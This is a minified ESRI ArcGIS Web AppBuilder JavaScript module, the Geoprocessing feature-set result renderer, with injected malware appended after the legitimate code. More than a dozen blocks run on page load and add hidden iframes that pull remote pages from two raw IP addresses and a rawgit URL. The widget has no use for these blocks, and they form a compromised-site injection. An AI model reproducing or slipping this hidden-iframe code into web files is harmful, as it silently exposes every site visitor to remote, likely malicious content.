// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/resultrenderers/FeatureSetRenderer.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"output-label" data-dojo-attach-point\x3d"labelNode"\x3e\r\n    \x3cspan data-dojo-attach-point\x3d"labelContent"\x3e${nls.drawnOnMap}\x3c/span\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"clear-node" data-dojo-attach-point\x3d"clearNode" style\x3d"display:none"\x3e\x3c/div\x3e\r\n  \x3cdiv class\x3d"popup-menu-button" data-dojo-attach-point\x3d"exportNode" style\x3d"display:none"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/dom-style dojo/dom-attr dojo/on dojo/dom-geometry dijit/_TemplatedMixin esri/layers/GraphicsLayer esri/layers/FeatureLayer esri/graphicsUtils esri/renderers/SimpleRenderer esri/renderers/jsonUtils esri/InfoTemplate jimu/dijit/FeatureActionPopupMenu dojo/text!./FeatureSetRenderer.html ../BaseResultRenderer ../LayerOrderUtil ./defaultSymbol ../utils".split(" "),function(n,e,g,d,l,m,p,q,r,t,u,h,v,w,x,y,z,A,k,B){return n([z,q],{baseClass:"jimu-gp-resultrenderer-base jimu-gp-renderer-draw-feature",
templateString:y,postCreate:function(){this.inherited(arguments);this.popupMenu=x.getInstance();this.value.features&&0<this.value.features.length?(this._displayText(),this._drawResultFeature(this.param,this.value)):(d.set(this.clearNode,"display","none"),d.set(this.exportNode,"display","none"),this.labelContent.innerHTML=this.nls.emptyResult)},destroy:function(){this.resultLayer&&this.map.removeLayer(this.resultLayer);this.inherited(arguments)},_displayText:function(){d.set(this.clearNode,"display",
"");l.set(this.clearNode,"title",this.nls.clear);this.own(m(this.clearNode,"click",e.hitch(this,function(){this.resultLayer&&(this.map.infoWindow.isShowing&&this.map.infoWindow.hide(),this.resultLayer.clear(),this.map.removeLayer(this.resultLayer));d.set(this.exportNode,"display","none");d.set(this.clearNode,"display","none");this.labelContent.innerHTML=this.nls.cleared})));d.set(this.exportNode,"display","");l.set(this.exportNode,"title",this.nls.exportOutput);this.own(m(this.exportNode,"click",
e.hitch(this,this._showActions)))},_showActions:function(a){this.popupMenu.prepareActions(this.value,this.config.showExportButton).then(e.hitch(this,function(){var b=p.position(a.target);this.popupMenu.show(b)}))},_drawResultFeature:function(a,b){var c,f=B.useDynamicSchema(a,this.config);if(!a.popup||f)a.popup={enablePopup:!0,title:"",fields:[]};a.popup.enablePopup&&(c=new w(a.popup.title||"${Non-Exist-Field}",this._generatePopupContent(b,f)));if(this.config.shareResults&&!f){if(!a.defaultValue||
!a.defaultValue.geometryType)throw Error("Output parameter default value does not provide enough information to draw feature layer.");a.defaultValue.name=a.name;this.resultLayer=new t({layerDefinition:a.defaultValue,featureSet:null},{id:this.widgetUID+a.name,infoTemplate:c})}else this.resultLayer=new r({id:this.widgetUID+a.name,infoTemplate:c});g.forEach(b.features,function(a){this.resultLayer.add(a)},this);this.resultLayer.title=a.label||a.name;c=a.renderer;f||!c?"esriGeometryPoint"===b.geometryType||
"esriGeometryMultipoint"===b.geometryType?c=new h(k.pointSymbol):"esriGeometryPolyline"===b.geometryType?c=new h(k.lineSymbol):"esriGeometryPolygon"===b.geometryType&&(c=new h(k.polygonSymbol)):c=v.fromJson(c);this.resultLayer.setRenderer(c);this.resultLayer.setVisibility(!0!==a.layerInvisible);this._addResultLayer(a.name);try{if(b.features&&0<b.features.length&&b.features[0].geometry){var d=u.graphicsExtent(b.features);d&&(this.resultLayer.fullExtent=d.expand(1.4),this.map.setExtent(this.resultLayer.fullExtent))}}catch(C){console.error(C)}},
_addResultLayer:function(a){var b=new A(this.config,this.map);try{b.calculateLayerIndex(a,this.widgetUID).then(e.hitch(this,function(a){-1!==a?this.map.addLayer(this.resultLayer,a):this.map.addLayer(this.resultLayer)}))}catch(c){console.error(c.message),console.warn("Draw result feature set on the top of map"),this.map.addLayer(this.resultLayer)}},_generatePopupContent:function(a,b){var c="";a=!b&&this.param.popup.fields&&0<this.param.popup.fields.length?g.filter(this.param.popup.fields,e.hitch(this,
function(a){return!1!==a.visible})):a.fields;g.forEach(a,function(a){c+='\x3ctr valign\x3d"top"\x3e\x3ctd class\x3d"attr-name"\x3e'+a.alias+'\x3c/td\x3e\x3ctd class\x3d"attr-value"\x3e${'+a.name+"}\x3c/td\x3e\x3c/tr\x3e"});return'\x3cdiv class\x3d"geoprocessing-popup"\x3e\x3ctable class\x3d"geoprocessing-popup-table" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\x3ctbody\x3e'+c+"\x3c/tbody\x3e\x3c/table\x3e\x3c/div\x3e"}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});